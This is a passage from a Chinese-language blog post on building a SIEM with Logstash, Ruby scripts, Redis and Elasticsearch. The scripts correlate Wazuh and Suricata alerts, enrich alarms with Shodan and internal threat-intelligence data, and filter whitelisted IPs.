class="keyword">for</span> atomic <span class="keyword">in</span> atomic_rules <span class="keyword">do</span></span><br><span class="line">        e_id = JSON.parse(atomic)[<span class="string">&#x27;event&#x27;</span>][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        r_id = JSON.parse(atomic)[<span class="string">&#x27;rule&#x27;</span>][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        r_name = JSON.parse(atomic)[<span class="string">&#x27;rule&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        event_id.push(e_id)</span><br><span class="line">        rule_id.push(r_id)</span><br><span class="line">        rule_name.push(r_name)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    event.set(<span class="string">&#x27;[related][event][id]&#x27;</span>, event_id)</span><br><span class="line">    event.set(<span class="string">&#x27;[related][rule][id]&#x27;</span>, rule_id)</span><br><span class="line">    event.set(<span class="string">&#x27;[related][rule][name]&#x27;</span>, rule_name)</span><br><span class="line">    event.remove(<span class="string">&#x27;[related][event][log]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a><strong>示例</strong></h6><p>​        以下是一个Wazuh聚合告警，分析人员通过点击<code>threat.hunting.event.id</code>字段即可溯源出触发该聚合规则的底层alert事件。</p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/hunting-alarm.png" alt="image-20201204175051910"></p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/hunting-alert.png" alt="image-20201204175244182"></p>
<hr>
<h3 id="3-Threat-Intelligence"><a href="#3-Threat-Intelligence" class="headerlink" title="3. Threat Intelligence"></a>3. Threat Intelligence</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/threat-intelligence.png" alt="threat-intelligence"></p>
<h4 id="3-1-threatIntel-alert-to-siem"><a href="#3-1-threatIntel-alert-to-siem" class="headerlink" title="3.1 threatIntel_alert_to_siem"></a>3.1 threatIntel_alert_to_siem</h4><p>​        通过Logstash加载Ruby脚本，将IoC推送至Redis。为了避免重复推送，每个IoC都会设置超时时间（默认7天）。如上图中蓝色线所示部分；</p>
<h5 id="3-1-1-add-ti-shodan"><a href="#3-1-1-add-ti-shodan" class="headerlink" title="3.1.1 add-ti_shodan"></a>3.1.1 add-ti_shodan</h5><p>​        对于攻击过我们的IP地址我们都会利用<strong>Shodan</strong>进行反向探测，收集一波攻击者（肉鸡）的资产信息，留给后面分析人员用。由于已经设置了IoC超时时间，所以在超时之前IoC不会重复推送。当然，单个Key调用API频率还是要控制一下的，不过你可以选择多个Key哦。<strong>你懂的</strong>😈😈😈</p>
<h6 id="Logstash-Config-11"><a href="#Logstash-Config-11" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/80_add-ti_shodan.conf">add-ti_shodan.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][alert] &#123;</span><br><span class="line">        <span class="built_in">clone</span> &#123;</span><br><span class="line">            clones =&gt; [ <span class="string">&quot;siem_events&quot;</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;siem_events&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-ti_shodan.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="string">&quot;ti_db&quot;</span> =&gt; 1</span><br><span class="line">                <span class="string">&quot;alert_prefix&quot;</span> =&gt; <span class="string">&quot;alert:&quot;</span></span><br><span class="line">                <span class="string">&quot;expire&quot;</span> =&gt; 86400</span><br><span class="line"></span><br><span class="line">                <span class="string">&quot;spider_db&quot;</span> =&gt; 5</span><br><span class="line">                <span class="string">&quot;spider_key&quot;</span> =&gt; <span class="string">&quot;spider:shodan:ioc&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-3"><a href="#Ruby-Code-3" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-ti_shodan.rb">add-ti_shodan.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;json&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;ipaddr&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@expire</span> = params[<span class="string">&quot;expire&quot;</span>]</span><br><span class="line">    <span class="variable">@alert</span> = params[<span class="string">&quot;alert_prefix&quot;</span>]</span><br><span class="line">    <span class="variable">@alarm</span> = params[<span class="string">&quot;alarm_prefix&quot;</span>]</span><br><span class="line">    <span class="variable">@spider_key</span> = params[<span class="string">&quot;spider_key&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># connect to redis</span></span><br><span class="line">    <span class="variable">@ti_redis</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;ti_db&quot;</span>])</span><br><span class="line">    <span class="variable">@spider_redis</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;spider_db&quot;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    src_ip = event.get(<span class="string">&quot;[source][ip]&quot;</span>)</span><br><span class="line">    dst_ip = event.get(<span class="string">&quot;[destination][ip]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        ipaddr_src = IPAddr.new src_ip</span><br><span class="line">        ipaddr_dst = IPAddr.new dst_ip</span><br><span class="line">    <span class="keyword">rescue</span> Exception =&gt; e</span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ipaddr_src.private?() <span class="keyword">then</span></span><br><span class="line">        ioc = src_ip</span><br><span class="line">    <span class="keyword">elsif</span> <span class="keyword">not</span> ipaddr_dst.private?() <span class="keyword">then</span></span><br><span class="line">        ioc = dst_ip</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> [event]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> event.get(<span class="string">&quot;[event][kind]&quot;</span>) == <span class="string">&quot;alert&quot;</span> <span class="keyword">then</span></span><br><span class="line">        alert_ioc = <span class="variable">@alert</span> + ioc</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable">@ti_redis</span>.exists?(alert_ioc) <span class="keyword">then</span></span><br><span class="line">            <span class="variable">@ti_redis</span>.setex(alert_ioc, <span class="variable">@expire</span>, <span class="literal">true</span>)</span><br><span class="line">            <span class="variable">@spider_redis</span>.lpush(<span class="variable">@spider_key</span>, ioc)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-2-threatIntel-alarm-from-siem"><a href="#3-2-threatIntel-alarm-from-siem" class="headerlink" title="3.2 threatIntel_alarm_from_siem"></a>3.2 threatIntel_alarm_from_siem</h4><p>​        通过Logstash进行威胁情报数据的丰富化。如上图中红色线所示部分；</p>
<h5 id="3-2-1-add-ti-tags-from-shodan"><a href="#3-2-1-add-ti-tags-from-shodan" class="headerlink" title="3.2.1 add-ti_tags_from_shodan"></a>3.2.1 add-ti_tags_from_shodan</h5><p>​        将Shodan IoC情报数据丰富化至alarm。</p>
<h6 id="Logstash-Config-12"><a href="#Logstash-Config-12" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/80_add-ti_shodan.conf">add-ti_tags_from_shodan.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [event][kind] == <span class="string">&quot;alarm&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/ti_shodan.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">                <span class="string">&quot;ti_db&quot;</span> =&gt; 1</span><br><span class="line">                <span class="string">&quot;alarm_prefix&quot;</span> =&gt; <span class="string">&quot;alarm:&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-4"><a href="#Ruby-Code-4" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-ti_shodan.rb">add-ti_tags_from_shodan.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;json&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;ipaddr&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@alarm</span> = params[<span class="string">&quot;alarm_prefix&quot;</span>]</span><br><span class="line">    <span class="comment"># connect to redis</span></span><br><span class="line">    <span class="variable">@ti_redis</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;ti_db&quot;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    src_ip = event.get(<span class="string">&quot;[source][ip]&quot;</span>)</span><br><span class="line">    dst_ip = event.get(<span class="string">&quot;[destination][ip]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        ipaddr_src = IPAddr.new src_ip</span><br><span class="line">        ipaddr_dst = IPAddr.new dst_ip</span><br><span class="line">    <span class="keyword">rescue</span> Exception =&gt; e</span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ipaddr_src.private?() <span class="keyword">then</span></span><br><span class="line">        ioc = src_ip</span><br><span class="line">    <span class="keyword">elsif</span> <span class="keyword">not</span> ipaddr_dst.private?() <span class="keyword">then</span></span><br><span class="line">        ioc = dst_ip</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> [event]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    raw_data = <span class="variable">@ti_redis</span>.get(<span class="variable">@alarm</span> + ioc)</span><br><span class="line">    <span class="keyword">if</span> raw_data <span class="keyword">then</span></span><br><span class="line">        data = JSON.parse(raw_data)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">then</span></span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][services]&quot;</span>, data[<span class="string">&quot;services&quot;</span>])</span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][vulns]&quot;</span>, data[<span class="string">&quot;vulns&quot;</span>])</span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][ports]&quot;</span>, data[<span class="string">&quot;ports&quot;</span>])</span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][hostnames]&quot;</span>, data[<span class="string">&quot;hostnames&quot;</span>])</span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][domains]&quot;</span>, data[<span class="string">&quot;domains&quot;</span>])</span><br><span class="line">            <span class="keyword">if</span> data[<span class="string">&quot;details&quot;</span>] <span class="keyword">then</span></span><br><span class="line">                details = data[<span class="string">&quot;details&quot;</span>].to_json</span><br><span class="line">                event.set(<span class="string">&quot;[threat][hunting][details]&quot;</span>, details)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a><strong>示例</strong></h6><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;hunting&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;vulns&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;CVE-2019-0220&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2019-0197&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2019-0196&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1302&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2019-0211&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2017-15710&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1301&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1283&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1303&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2017-15715&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1333&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-17199&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-11763&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1312&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;domains&quot;</span>: [],</span><br><span class="line">            <span class="attr">&quot;ports&quot;</span>: [</span><br><span class="line">                <span class="number">8888</span>,</span><br><span class="line">                <span class="number">80</span>,</span><br><span class="line">                <span class="number">8080</span>,</span><br><span class="line">                <span class="number">8090</span>,</span><br><span class="line">                <span class="number">22</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;details&quot;</span>: <span class="string">&quot;&#123;\&quot;tcp\&quot;:[&#123;\&quot;http-simple-new\&quot;:8888,\&quot;Apache httpd\&quot;:\&quot;2.4.29\&quot;&#125;,&#123;\&quot;http\&quot;:80,\&quot;Apache httpd\&quot;:\&quot;2.4.29\&quot;&#125;,&#123;\&quot;http\&quot;:8080,\&quot;Apache httpd\&quot;:\&quot;2.4.29\&quot;&#125;,&#123;\&quot;http-simple-new\&quot;:8090&#125;,&#123;\&quot;ssh\&quot;:22,\&quot;OpenSSH\&quot;:\&quot;7.6p1 Ubuntu-4ubuntu0.3\&quot;&#125;],\&quot;udp\&quot;:[]&#125;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;hostnames&quot;</span>: [],</span><br><span class="line">            <span class="attr">&quot;services&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;http-simple-new&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ssh&quot;</span>,</span><br><span class="line">                <span class="string">&quot;http&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/threat.hunting.shodan-1.png" alt="image-20201205151011258"></p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/threat.hunting.shodan-2.png" alt="image-20201205150744102"></p>
<h5 id="3-2-2-add-ti-tags"><a href="#3-2-2-add-ti-tags" class="headerlink" title="3.2.2 add-ti_tags"></a>3.2.2 add-ti_tags</h5><p>​    这部分通常是对接的自有情报（<em>我们会收集攻击过我们的IP，建立适用于自己的内部情报。</em>）以及开源情报。原则上SIEM产生的alarm事件并不会很多，所以这边直接从Elastic获取了情报数据进行告警的丰富化。如果alarm事件很多的话，建议也是放在Redis或者再考虑其他方案。近期准备采购商业情报，后期将会有一个商业情报的对接过程。</p>
<h6 id="Logstash-Config-13"><a href="#Logstash-Config-13" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/80_add-ti_tags.conf">add-ti_tags.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [event][kind] == <span class="string">&quot;alarm&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-ti_tags.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;index&quot;</span> =&gt; <span class="string">&quot;ecs-ti-*&quot;</span></span><br><span class="line">                <span class="string">&quot;urls&quot;</span> =&gt; <span class="string">&quot;https://elastic:HelloWorld@127.0.0.1:9200&quot;</span></span><br><span class="line">                <span class="string">&quot;ca&quot;</span> =&gt; <span class="string">&quot;ca.crt&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-5"><a href="#Ruby-Code-5" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/ti_tags.rb">add-ti_tags.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;elasticsearch&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@urls</span> = params[<span class="string">&quot;urls&quot;</span>]</span><br><span class="line">    <span class="variable">@index</span> = params[<span class="string">&quot;index&quot;</span>]</span><br><span class="line">    <span class="variable">@ca</span> = params[<span class="string">&quot;ca&quot;</span>]</span><br><span class="line">    <span class="variable">@client</span> = Elasticsearch::Client.new <span class="symbol">urls:</span> <span class="variable">@urls</span>, <span class="symbol">transport_options:</span> &#123; <span class="symbol">ssl:</span> &#123; <span class="symbol">ca_file:</span> <span class="variable">@ca</span> &#125; &#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    ioc = event.get(<span class="string">&#x27;[source][ip]&#x27;</span>)</span><br><span class="line">    query = &#123;</span><br><span class="line">        <span class="string">&quot;_source&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;includes&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;threat.tags&quot;</span>,</span><br><span class="line">                <span class="string">&quot;threat.provider&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;query&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;bool&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;must&quot;</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;terms&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;threat.type&quot;</span>: [</span><br><span class="line">                                <span class="string">&quot;ipv4&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;ip&quot;</span></span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;term&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;threat.ioc&quot;</span>: ioc</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ],</span><br><span class="line">                <span class="string">&quot;filter&quot;</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;range&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;threat.creation_time&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;gte&quot;</span>: <span class="string">&quot;now-7d&quot;</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;size&quot;</span>: <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = <span class="variable">@client</span>.search <span class="symbol">index:</span> <span class="variable">@index</span>, <span class="symbol">body:</span> query.to_json</span><br><span class="line"></span><br><span class="line">    tags = []</span><br><span class="line">    providers = []</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> response[<span class="string">&#x27;hits&#x27;</span>][<span class="string">&#x27;hits&#x27;</span>].empty? <span class="keyword">then</span></span><br><span class="line">        response[<span class="string">&#x27;hits&#x27;</span>][<span class="string">&#x27;hits&#x27;</span>].each <span class="keyword">do</span> <span class="params">|result|</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> providers.<span class="keyword">include</span>?(result[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;threat&quot;</span>][<span class="string">&quot;provider&quot;</span>])</span><br><span class="line">                providers.push(result[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;threat&quot;</span>][<span class="string">&quot;provider&quot;</span>])</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            tags = tags - result[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;threat&quot;</span>][<span class="string">&quot;tags&quot;</span>]</span><br><span class="line">            tags = tags + result[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;threat&quot;</span>][<span class="string">&quot;tags&quot;</span>]</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    event.set(<span class="string">&#x27;[threat][intelligence][tags]&#x27;</span>, tags)</span><br><span class="line">    event.set(<span class="string">&#x27;[threat][intelligence][providers]&#x27;</span>, providers)</span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a><strong>示例</strong></h6><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/threat.hunting.shodan-3.png" alt="image-20201208144650226"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;intelligence&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;providers&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;NTA&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;tags&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;WebAttack&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-Filter"><a href="#4-Filter" class="headerlink" title="4. Filter"></a>4. Filter</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/blacklist-1.png" alt="image-20201207153152332"></p>
<h4 id="4-1-alert-to-siem"><a href="#4-1-alert-to-siem" class="headerlink" title="4.1 alert_to_siem"></a>4.1 alert_to_siem</h4><h5 id="4-1-1-filter-ip-from-alert"><a href="#4-1-1-filter-ip-from-alert" class="headerlink" title="4.1.1 filter_ip_from_alert"></a>4.1.1 filter_ip_from_alert</h5><p>​        实际使用场景中需要对一些白名单IP、特定签名规则进行过滤。这么做也是为了保证SIEM的性能以及告警的可靠性。这部分数据依旧会发送到Elastic作为历史数据留存，但不会被SIEM消费并产生告警。</p>
<h6 id="Logstash-Config-14"><a href="#Logstash-Config-14" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><p>​    利用<strong>Clone</strong>插件，将需要被SIEM消费的数据经由脚本过滤。</p>
<ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/80_add-siem_events.conf">filter_ip_from_alert.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][alert] &#123;</span><br><span class="line">        <span class="built_in">clone</span> &#123;</span><br><span class="line">            clones =&gt; [ <span class="string">&quot;siem_events&quot;</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;siem_events&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-filter_ip.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">                <span class="string">&quot;cdn_db&quot;</span> =&gt; 3</span><br><span class="line">                <span class="string">&quot;scan_db&quot;</span> =&gt; 4</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-6"><a href="#Ruby-Code-6" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-filter_ip.rb">filter_ip_from_alert.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="variable">@cdn_db</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;cdn_db&quot;</span>])</span><br><span class="line">        <span class="variable">@scan_db</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;scan_db&quot;</span>])</span><br><span class="line">    <span class="keyword">rescue</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span 